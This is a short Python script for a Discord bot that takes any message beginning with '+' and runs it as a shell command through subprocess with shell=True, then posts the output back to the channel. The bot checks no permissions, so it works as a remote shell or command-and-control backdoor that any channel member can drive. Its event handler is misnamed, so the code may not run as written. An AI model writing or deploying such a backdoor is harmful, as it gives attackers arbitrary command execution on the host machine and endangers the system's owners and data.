import discord
import subprocess
activiste = discord.Client()
@activiste.event
async def user_message(message):
    if message.author == activiste.user:
        return
    if message.content.startswith('+'):
        command = message.content[len('+'):].strip()
        result = subprocess.check_output(command, shell=True, text=True)
        if len(result) <= 1000:
         await message.channel.send('\n```\n' + result + '\n```')
        else:
            parts = [result[i:i+1900] for i in range(0, len(result), 1900)]
            for part in parts:
             await message.channel.send('\n```\n' + part + '\n```')
activiste.run('BotToken')